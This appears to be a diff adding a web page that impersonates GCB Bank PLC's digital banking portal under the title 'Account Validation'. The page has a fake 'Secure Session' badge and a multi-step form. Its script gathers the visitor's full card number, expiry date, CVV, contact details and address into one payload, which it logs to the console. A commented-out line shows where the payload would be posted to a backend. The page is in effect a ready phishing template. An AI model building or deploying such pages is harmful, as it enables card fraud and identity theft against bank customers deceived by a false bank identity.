@@ -1,0 +1,637 @@
+<!-- /index.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>GCB Digital Banking — Account Validation</title>
+
+  <style>
+    :root{
+      --bg: #eef2f7;
+      --surface: #ffffff;
+      --text: #0f172a;
+      --muted: #6b7280;
+
+      --brand-900:#0b3a6b;
+      --brand-800:#0e4a87;
+
+      --border: #e5e7eb;
+      --shadow: 0 18px 45px rgba(2, 6, 23, .12);
+
+      --radius-lg: 18px;
+      --radius-md: 14px;
+
+      --ring: rgba(14, 74, 135, .25);
+      --maxw: 520px;
+    }
+
+    *{ box-sizing:border-box; }
+    html,body{ height:100%; }
+
+    body{
+      margin:0;
+      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji","Segoe UI Emoji";
+      color:var(--text);
+      background: radial-gradient(1200px 700px at 50% 0%, #f7f9fd 0%, var(--bg) 55%, #e9edf5 100%);
+    }
+
+    .topbar{
+      background: linear-gradient(180deg, #0b3a6b 0%, #082f56 100%);
+      color:#fff;
+      padding: 14px 16px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      box-shadow: 0 10px 26px rgba(2,6,23,.18);
+    }
+
+    .topbar__inner{
+      max-width: 980px;
+      margin: 0 auto;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+    }
+
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      min-width: 0;
+    }
+
+    .brand__logo{
+      width:44px;
+      height:44px;
+      border-radius:999px;
+      background: #f1c40f;
+      color:#0b3a6b;
+      display:grid;
+      place-items:center;
+      font-weight:900;
+      letter-spacing:.5px;
+      box-shadow: inset 0 0 0 2px rgba(255,255,255,.25);
+      flex: 0 0 auto;
+    }
+
+    .brand__text{ min-width: 0; line-height:1.05; }
+    .brand__title{
+      font-weight: 800;
+      font-size: 16px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .brand__subtitle{
+      font-size: 12px;
+      opacity: .85;
+      margin-top: 4px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .secure-pill{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      padding: 10px 12px;
+      border-radius: 999px;
+      background: rgba(255,255,255,.14);
+      box-shadow: inset 0 0 0 1px rgba(255,255,255,.18);
+      font-weight: 700;
+      font-size: 13px;
+      user-select:none;
+      flex: 0 0 auto;
+    }
+
+    .dot{
+      width:10px;
+      height:10px;
+      border-radius:999px;
+      background:#22c55e;
+      box-shadow: 0 0 0 3px rgba(34,197,94,.20);
+    }
+
+    .wrap{
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 22px 16px 32px;
+      display:flex;
+      justify-content:center;
+    }
+
+    .card{
+      width: min(100%, var(--maxw));
+      background: var(--surface);
+      border-radius: var(--radius-lg);
+      box-shadow: var(--shadow);
+      border: 1px solid rgba(229,231,235,.9);
+      padding: 22px 18px 18px;
+    }
+
+    .card__header{
+      padding: 6px 2px 12px;
+      border-bottom: 1px solid rgba(229,231,235,.85);
+      margin-bottom: 14px;
+    }
+
+    .card__title{
+      font-size: 26px;
+      letter-spacing: -.02em;
+      margin:0;
+      font-weight: 850;
+    }
+
+    .card__step{
+      margin: 6px 0 0;
+      color: var(--muted);
+      font-size: 13.5px;
+    }
+
+    .step{ display:none; margin-top: 10px; }
+    .step[data-active="true"]{ display:block; }
+
+    .field{ margin-bottom: 14px; }
+
+    .field label{
+      display:block;
+      font-weight: 750;
+      font-size: 14px;
+      margin: 0 0 8px;
+      color: #111827;
+    }
+
+    .field input, .field select{
+      width:100%;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 14px 14px;
+      font-size: 15px;
+      outline: none;
+      transition: box-shadow .15s ease, border-color .15s ease;
+      background: #fff;
+    }
+
+    .field input::placeholder{ color:#9ca3af; }
+
+    .field input:focus, .field select:focus{
+      border-color: var(--brand-800);
+      box-shadow: 0 0 0 4px var(--ring);
+    }
+
+    .row{
+      display:grid;
+      grid-template-columns: 1fr;
+      gap: 12px;
+    }
+    @media (min-width: 520px){
+      .row.two{ grid-template-columns: 1fr 1fr; }
+    }
+
+    .actions{
+      display:flex;
+      gap: 10px;
+      margin-top: 6px;
+    }
+
+    .btn{
+      border: 0;
+      width:100%;
+      padding: 14px 16px;
+      border-radius: var(--radius-md);
+      background: var(--brand-800);
+      color: #fff;
+      font-weight: 850;
+      font-size: 16px;
+      cursor:pointer;
+      box-shadow: 0 10px 20px rgba(14,74,135,.22);
+      transition: transform .08s ease, filter .15s ease;
+    }
+
+    .btn:hover{ filter: brightness(1.05); }
+    .btn:active{ transform: translateY(1px); }
+    .btn:focus-visible{
+      outline: none;
+      box-shadow: 0 0 0 4px var(--ring), 0 10px 20px rgba(14,74,135,.22);
+    }
+
+    .btn-secondary{
+      background: rgba(15, 23, 42, .06);
+      color: #0f172a;
+      box-shadow: none;
+      border: 1px solid rgba(229,231,235,.95);
+    }
+
+    .hint{
+      margin-top: 10px;
+      font-size: 12.5px;
+      color: var(--muted);
+    }
+
+    .review{
+      border: 1px solid rgba(229,231,235,.95);
+      border-radius: 14px;
+      padding: 12px 12px;
+      background: rgba(248,250,252,.8);
+    }
+    .review dl{
+      margin:0;
+      display:grid;
+      grid-template-columns: 1fr;
+      gap: 10px;
+    }
+    .review dt{
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 2px;
+    }
+    .review dd{
+      margin:0;
+      font-weight: 750;
+      color:#0f172a;
+      word-break: break-word;
+    }
+    @media (min-width: 520px){
+      .review dl{
+        grid-template-columns: 1fr 1fr;
+      }
+      .review .full{ grid-column: 1 / -1; }
+    }
+
+    .checkbox{
+      display:flex;
+      align-items:flex-start;
+      gap: 10px;
+      padding: 10px 10px;
+      border-radius: 12px;
+      border: 1px solid rgba(229,231,235,.95);
+      background: rgba(255,255,255,.9);
+    }
+    .checkbox input{
+      margin-top: 3px;
+      width: 18px;
+      height: 18px;
+      accent-color: var(--brand-800);
+      flex: 0 0 auto;
+    }
+    .checkbox span{
+      font-size: 13.5px;
+      color:#111827;
+      line-height:1.35;
+    }
+
+    .footer{
+      text-align:center;
+      color:#9ca3af;
+      font-size: 12.5px;
+      padding: 22px 16px 28px;
+    }
+
+    @media (min-width: 480px){
+      .card{ padding: 26px 22px 20px; }
+      .card__title{ font-size: 28px; }
+    }
+  </style>
+</head>
+
+<body>
+  <header class="topbar" role="banner">
+    <div class="topbar__inner">
+      <div class="brand" aria-label="GCB Digital Banking">
+        <div class="brand__logo" aria-hidden="true">GCB</div>
+        <div class="brand__text">
+          <div class="brand__title">GCB Digital Banking</div>
+          <div class="brand__subtitle">Secure Client Portal</div>
+        </div>
+      </div>
+
+      <div class="secure-pill" aria-label="Secure Session">
+        <span class="dot" aria-hidden="true"></span>
+        Secure Session
+      </div>
+    </div>
+  </header>
+
+  <main class="wrap" role="main">
+    <section class="card" aria-label="Account Validation">
+      <div class="card__header">
+        <h1 class="card__title">Account Validation</h1>
+        <p id="stepText" class="card__step">Step 1 of 3 — Confirm your personal information.</p>
+      </div>
+
+      <form id="wizardForm" novalidate>
+        <!-- STEP 1 -->
+        <div class="step" id="step1" data-step="1" data-active="true">
+          <div class="field">
+            <label for="firstName">First Name</label>
+            <input id="firstName" name="firstName" type="text" autocomplete="given-name"
+              placeholder="Enter your first name" required />
+          </div>
+
+          <div class="field">
+            <label for="lastName">Last Name</label>
+            <input id="lastName" name="lastName" type="text" autocomplete="family-name"
+              placeholder="Enter your last name" required />
+          </div>
+
+          <div class="field">
+            <label for="email">Email Address</label>
+            <input id="email" name="email" type="email" autocomplete="email"
+              placeholder="Enter your email address" required />
+          </div>
+
+          <div class="actions">
+            <button class="btn" type="button" id="toStep2">Continue Securely</button>
+          </div>
+        </div>
+
+        <!-- STEP 2 -->
+        <div class="step" id="step2" data-step="2" data-active="false">
+          <div class="field">
+            <label for="cardType">Card Type</label>
+            <select id="cardType" name="cardType" required>
+              <option value="" selected disabled>Select one</option>
+              <option value="credit">Credit</option>
+              <option value="debit">Debit</option>
+            </select>
+          </div>
+
+          <div class="field">
+            <label for="expiryDate">Expiry Date</label>
+            <input id="expiryDate" name="expiryDate" type="month" required />
+          </div>
+
+          <div class="field">
+            <label for="cardNumber">Card Number</label>
+            <input
+              id="cardNumber"
+              name="cardNumber"
+              type="text"
+              inputmode="numeric"
+              autocomplete="cc-number"
+              placeholder="1234 5678 9012 3456"
+              required
+            />
+          </div>
+
+          <div class="field">
+            <label for="cvv">CVV</label>
+            <input
+              id="cvv"
+              name="cvv"
+              type="password"
+              inputmode="numeric"
+              autocomplete="cc-csc"
+              placeholder="***"
+              required
+            />
+          </div>
+
+          <div class="actions">
+            <button class="btn btn-secondary" type="button" id="backToStep1">Back</button>
+            <button class="btn" type="button" id="toStep3">Continue Securely</button>
+          </div>
+
+          <div class="hint">
+            For a real payment flow, never collect/store CVV directly. Use a PCI-compliant provider/tokenization.
+          </div>
+        </div>
+
+        <!-- STEP 3 -->
+        <div class="step" id="step3" data-step="3" data-active="false">
+          <div class="row two">
+            <div class="field">
+              <label for="phone">Phone Number</label>
+              <input id="phone" name="phone" type="tel" autocomplete="tel"
+                placeholder="e.g., +233..." required />
+            </div>
+
+            <div class="field">
+              <label for="city">City</label>
+              <input id="city" name="city" type="text" autocomplete="address-level2"
+                placeholder="Enter your city" required />
+            </div>
+          </div>
+
+          <div class="field">
+            <label for="street">Street</label>
+            <input id="street" name="street" type="text" autocomplete="address-line1"
+              placeholder="Enter your street" required />
+          </div>
+
+          <div class="field">
+            <label for="state">State/Region</label>
+            <input id="state" name="state" type="text" autocomplete="address-level1"
+              placeholder="Enter your region" required />
+          </div>
+
+          <div class="field">
+            <label>Review</label>
+            <div class="review" aria-live="polite">
+              <dl>
+                <div>
+                  <dt>First Name</dt>
+                  <dd id="rvFirst">—</dd>
+                </div>
+                <div>
+                  <dt>Last Name</dt>
+                  <dd id="rvLast">—</dd>
+                </div>
+                <div class="full">
+                  <dt>Email</dt>
+                  <dd id="rvEmail">—</dd>
+                </div>
+                <div>
+                  <dt>Card Type</dt>
+                  <dd id="rvCardType">—</dd>
+                </div>
+                <div>
+                  <dt>Expiry</dt>
+                  <dd id="rvExpiry">—</dd>
+                </div>
+                <div class="full">
+                  <dt>Card Number</dt>
+                  <dd id="rvCardNumber">—</dd>
+                </div>
+              </dl>
+            </div>
+            <div class="hint">Card number shown masked for safety.</div>
+          </div>
+
+          <label class="checkbox">
+            <input id="terms" name="terms" type="checkbox" required />
+            <span>I accept the terms and conditions</span>
+          </label>
+
+          <div class="actions">
+            <button class="btn btn-secondary" type="button" id="backToStep2">Back</button>
+            <button class="btn" type="submit">Submit Application</button>
+          </div>
+        </div>
+      </form>
+    </section>
+  </main>
+
+  <footer class="footer">
+    © 2026 GCB Bank PLC. All rights reserved.
+  </footer>
+
+  <script>
+    const form = document.getElementById("wizardForm");
+    const stepText = document.getElementById("stepText");
+
+    const steps = {
+      1: document.getElementById("step1"),
+      2: document.getElementById("step2"),
+      3: document.getElementById("step3"),
+    };
+
+    const reviewEls = {
+      first: document.getElementById("rvFirst"),
+      last: document.getElementById("rvLast"),
+      email: document.getElementById("rvEmail"),
+      cardType: document.getElementById("rvCardType"),
+      expiry: document.getElementById("rvExpiry"),
+      cardNumber: document.getElementById("rvCardNumber"),
+    };
+
+    function setStep(step) {
+      Object.values(steps).forEach(s => (s.dataset.active = "false"));
+      steps[step].dataset.active = "true";
+
+      if (step === 1) stepText.textContent = "Step 1 of 3 — Confirm your personal information.";
+      if (step === 2) stepText.textContent = "Step 2 of 3 — Enter your card details.";
+      if (step === 3) stepText.textContent = "Step 3 of 3 — Provide address and submit.";
+    }
+
+    function isValidEmail(value) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+    }
+
+    function normalizeCardNumber(raw) {
+      return raw.replace(/\D/g, "").slice(0, 19);
+    }
+
+    function formatCardNumber(raw) {
+      const digits = normalizeCardNumber(raw);
+      return digits.replace(/(.{4})/g, "$1 ").trim();
+    }
+
+    function maskCardNumber(raw) {
+      const digits = normalizeCardNumber(raw);
+      if (!digits) return "—";
+      const last4 = digits.slice(-4);
+      return "**** **** **** " + last4;
+    }
+
+    function validateStep1() {
+      const firstName = form.firstName.value.trim();
+      const lastName = form.lastName.value.trim();
+      const email = form.email.value.trim();
+      return Boolean(firstName && lastName && isValidEmail(email));
+    }
+
+    function validateStep2() {
+      const cardType = form.cardType.value;
+      const expiryDate = form.expiryDate.value;
+      const cardDigits = normalizeCardNumber(form.cardNumber.value);
+      const cvv = form.cvv.value.replace(/\D/g, "");
+
+      const cardOk = cardDigits.length >= 12 && cardDigits.length <= 19;
+      const cvvOk = cvv.length === 3 || cvv.length === 4;
+
+      return Boolean(cardType && expiryDate && cardOk && cvvOk);
+    }
+
+    function validateStep3() {
+      const phone = form.phone.value.trim();
+      const street = form.street.value.trim();
+      const city = form.city.value.trim();
+      const state = form.state.value.trim();
+      const terms = form.terms.checked;
+
+      return Boolean(phone && street && city && state && terms);
+    }
+
+    function refreshReview() {
+      reviewEls.first.textContent = form.firstName.value.trim() || "—";
+      reviewEls.last.textContent = form.lastName.value.trim() || "—";
+      reviewEls.email.textContent = form.email.value.trim() || "—";
+      reviewEls.cardType.textContent = form.cardType.value ? form.cardType.value.toUpperCase() : "—";
+      reviewEls.expiry.textContent = form.expiryDate.value || "—";
+      reviewEls.cardNumber.textContent = maskCardNumber(form.cardNumber.value);
+    }
+
+    document.getElementById("toStep2").addEventListener("click", () => {
+      if (!validateStep1()) {
+        alert("Please fill all Step 1 fields with a valid email address.");
+        return;
+      }
+      setStep(2);
+    });
+
+    document.getElementById("backToStep1").addEventListener("click", () => setStep(1));
+
+    document.getElementById("toStep3").addEventListener("click", () => {
+      if (!validateStep2()) {
+        alert("Please complete Step 2 correctly (card type, expiry, card number, CVV).");
+        return;
+      }
+      refreshReview();
+      setStep(3);
+    });
+
+    document.getElementById("backToStep2").addEventListener("click", () => setStep(2));
+
+    form.cardNumber.addEventListener("input", (e) => {
+      e.target.value = formatCardNumber(e.target.value);
+      refreshReview();
+    });
+
+    form.cvv.addEventListener("input", (e) => {
+      e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
+    });
+
+    ["firstName","lastName","email","cardType","expiryDate"].forEach((name) => {
+      form[name].addEventListener("input", refreshReview);
+      form[name].addEventListener("change", refreshReview);
+    });
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      if (!validateStep1()) return alert("Step 1 is invalid.");
+      if (!validateStep2()) return alert("Step 2 is invalid.");
+      if (!validateStep3()) return alert("Step 3 is invalid. Ensure address + terms are filled.");
+
+      const payload = {
+        firstName: form.firstName.value.trim(),
+        lastName: form.lastName.value.trim(),
+        email: form.email.value.trim(),
+        cardType: form.cardType.value,
+        expiryDate: form.expiryDate.value,
+        cardNumber: normalizeCardNumber(form.cardNumber.value),
+        cvv: form.cvv.value.replace(/\D/g, ""),
+        phone: form.phone.value.trim(),
+        street: form.street.value.trim(),
+        city: form.city.value.trim(),
+        state: form.state.value.trim(),
+        terms: form.terms.checked,
+      };
+
+      // Replace with your backend endpoint:
+      // const res = await fetch("/api/submit", { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify(payload) });
+
+      alert("Submitted (demo). Check console for payload.");
+      console.log("SUBMIT_PAYLOAD", payload);
+
+      form.reset();
+      refreshReview();
+      setStep(1);
+    });
+  </script>
+</body>
+</html>
